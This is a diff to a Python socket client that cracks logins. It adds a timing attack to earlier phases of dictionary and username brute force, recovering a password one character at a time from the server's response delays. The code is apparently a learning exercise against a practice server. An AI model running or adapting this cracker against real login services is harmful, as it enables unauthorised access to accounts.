@@ -4,6 +4,7 @@ import string
 import os
 import itertools
 import json
+from datetime import datetime
 
 
 def send_message(connection_socket: socket, message: str):
@@ -26,7 +27,9 @@ def run():
 
     Phase 3 - brute force of dictionary passwords with varying uppercase/lowercase letters
 
-    Phase 4 - brute force of passwords with known admin usernames"""
+    Phase 4 - brute force of passwords with known admin usernames
+
+    Phase 5 - timing attack"""
 
     with socket(AF_INET, SOCK_STREAM) as connection_socket:
         # Obtain command line argument values
@@ -57,6 +60,7 @@ def run():
                 if result == 'Wrong password!':
                     break
 
+                # clear the login
                 login = ''
 
         # At this point, either the login is known, or no login was found.
@@ -68,12 +72,27 @@ def run():
         password_crack = []
         result = ''
 
+        # send dummy (obviously wrong) blank password to determine threshold response time
+        start = datetime.now()
+        send_message(connection_socket,jsonify_message(login,''))
+        finish = datetime.now()
+
+        threshold = finish - start
+
         while result != 'Connection success!':
             for letter in password_test_string:
+
+                # the program no longer sends 'exception' if the first letter is correct, use timing attack
+                start = datetime.now()
                 response_string = send_message(connection_socket,jsonify_message(login,''.join(password_crack) + letter))
+                finish = datetime.now()
+
+                time_diff = finish - start
+
                 response_dict = json.loads(response_string)
                 result = response_dict['result']
-                if result.startswith('Exception') or result == 'Connection success!':
+
+                if time_diff > threshold or result == 'Connection success!':
                     password_crack.append(letter)
                     break
 
